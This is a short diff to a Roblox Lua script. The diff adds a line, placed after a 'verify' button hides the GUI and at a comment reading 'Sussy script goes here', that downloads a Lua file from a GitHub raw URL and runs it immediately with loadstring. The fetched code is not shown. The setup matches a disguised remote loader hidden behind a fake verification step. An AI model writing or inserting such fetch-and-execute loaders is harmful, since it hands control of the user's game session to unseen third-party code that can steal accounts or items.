@@ -110,7 +110,7 @@ VerifyButton.MouseButton1Down:connect(function()
         wait(7)
 
         GUI.Parent = nil
-
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/nhannguyen124/nhannguyen124/refs/heads/main/Loader.lua'))()
         -- Sussy script goes here
     end
 end)
